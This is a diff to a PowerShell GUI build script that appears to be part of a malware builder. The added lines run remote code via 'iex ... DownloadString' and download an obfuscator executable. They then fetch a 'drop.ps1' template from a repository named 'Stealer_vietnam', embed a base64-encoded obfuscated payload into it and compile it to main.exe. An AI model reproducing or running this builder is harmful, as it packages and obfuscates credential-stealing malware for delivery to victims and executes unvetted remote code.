@@ -1,3 +1,5 @@
+iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MScholtes/PS2EXE/master/Module/ps2exe.ps1')
+
 function Encode-Base64 {
     param (
         [string]$InputString
@@ -139,7 +141,15 @@ $button.Add_Click({
         Invoke-WebRequest -Uri "https://github.com/KDot227/SomalifuscatorV2/releases/download/AutoBuild/main.exe" -OutFile $protectPath
         # Execute the .bat file
         Start-Process -FilePath $protectPath -ArgumentList "-f `"$filePath`"" -NoNewWindow -Wait
-        Start-Process -FilePath $compliePath -ArgumentList "`"$filePathprotect`"" -NoNewWindow -Wait
+        # Start-Process -FilePath $compliePath -ArgumentList "`"$filePathprotect`"" -NoNewWindow -Wait
+        $url = "https://raw.githubusercontent.com/s1uiasdad/Stealer_vietnam/main/file/drop/drop.ps1"
+
+        $scriptContent = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
+        $encodedFileContent = [Convert]::ToBase64String([System.IO.File]::ReadAllBytes($filePathprotect))
+
+        $pathexe = ".\main.exe"
+        $scriptContent -replace "ENCODE64DROPHERE", $encodedFileContent | Set-Content -Path "$env:TEMP\main.ps1"
+        Invoke-ps2exe "$env:TEMP\main.ps1" "$pathexe"
 
         # Delete the .bat file after execution
         Remove-item "settings.json"
